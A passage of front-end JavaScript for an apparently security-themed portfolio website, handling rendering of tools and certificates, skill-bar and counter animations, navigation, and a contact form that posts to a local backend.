  document.getElementById("toolsGrid").innerHTML = TOOLS.map(t => `<div class="tool-tag">${t}</div>`).join("");

  document.getElementById("certsList").innerHTML = CERTS.map(c => `
    <div class="cert-item">
      <span class="cert-icon">${c.icon}</span>
      <div>
        <div class="cert-name">${c.name}</div>
        <div class="cert-issuer">${c.issuer}</div>
      </div>
    </div>
  `).join("");
}

/* === SKILL BAR ANIMATION === */
const skillObserver = new IntersectionObserver((entries) => {
  entries.forEach(e => {
    if (e.isIntersecting) {
      e.target.querySelectorAll(".skill-bar-fill").forEach(bar => {
        bar.style.width = bar.dataset.pct + "%";
      });
    }
  });
}, { threshold: 0.3 });

/* === COUNT UP === */
function animateCounters() {
  document.querySelectorAll(".stat-num").forEach(el => {
    const target = parseInt(el.dataset.count);
    let current = 0;
    const step = target / 40;
    const timer = setInterval(() => {
      current = Math.min(current + step, target);
      el.textContent = Math.floor(current);
      if (current >= target) clearInterval(timer);
    }, 40);
  });
}

/* === FILTERS === */
document.addEventListener("click", e => {
  if (e.target.classList.contains("filter-btn")) {
    document.querySelectorAll(".filter-btn").forEach(b => b.classList.remove("active"));
    e.target.classList.add("active");
    renderWriteups(e.target.dataset.filter);
  }
});

/* === NAV ACTIVE STATE === */
const sections = document.querySelectorAll("section[id]");
const navLinks = document.querySelectorAll(".nav-link");
const navObserver = new IntersectionObserver((entries) => {
  entries.forEach(e => {
    if (e.isIntersecting) {
      navLinks.forEach(l => l.classList.remove("active"));
      const active = document.querySelector(`.nav-link[data-section="${e.target.id}"]`);
      if (active) active.classList.add("active");
    }
  });
}, { threshold: 0.4 });
sections.forEach(s => navObserver.observe(s));

/* === MOBILE NAV === */
document.getElementById("navToggle").addEventListener("click", () => {
  document.querySelector(".nav-links").classList.toggle("open");
});

/* === CONTACT FORM === */
document.getElementById("sendBtn").addEventListener("click", async () => {
  const name = document.getElementById("contactName").value.trim();
  const email = document.getElementById("contactEmail").value.trim();
  const msg = document.getElementById("contactMsg").value.trim();
  const status = document.getElementById("formStatus");

  if (!name || !email || !msg) {
    status.textContent = "// ERROR: All fields required.";
    status.style.color = "var(--accent3)";
    return;
  }

  status.textContent = "// Transmitting...";
  status.style.color = "var(--accent4)";

  try {
    const res = await fetch("http://localhost:8000/api/contact", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name, email, message: msg })
    });
    if (res.ok) {
      status.textContent = "// Message transmitted successfully. ✓";
      status.style.color = "var(--accent)";
      document.getElementById("contactName").value = "";
      document.getElementById("contactEmail").value = "";
      document.getElementById("contactMsg").value = "";
    } else {
      status.textContent = "// Server error. Try again.";
      status.style.color = "var(--accent3)";
    }
  } catch {
    status.textContent = "// Network error — check backend server.";
    status.style.color = "var(--accent3)";
  }
});

/* === FOOTER TIME === */
function updateTime() {
  document.getElementById("footerTime").textContent = new Date().toISOString().replace("T", " ").substring(0, 19) + " UTC";
}

/* === UTILITIES === */
const sleep = ms => new Promise(r => setTimeout(r, ms));
const timestamp = () => new Date().toTimeString().substring(0, 8);

/* === INIT === */
async function init() {
  await runBoot();
  renderProjects();
  renderWriteups();
  renderCTF();
  renderSkills();
  updateTime();
  setInterval(updateTime, 1000);

  // Observe skills section
  const skillsSection = document.getElementById("skills");
  if (skillsSection) skillObserver.observe(skillsSection);

  // Counter animation on hero visible
  const heroObserver = new IntersectionObserver(entries => {
    if (entries[0].isIntersecting) { animateCounters(); heroObserver.disconnect(); }
  }, { threshold: 0.5 });
  heroObserver.observe(document.getElementById("home"));

  // Run terminal after boot
  setTimeout(runTerminal, 600);
}

document.addEventListener("DOMContentLoaded", init);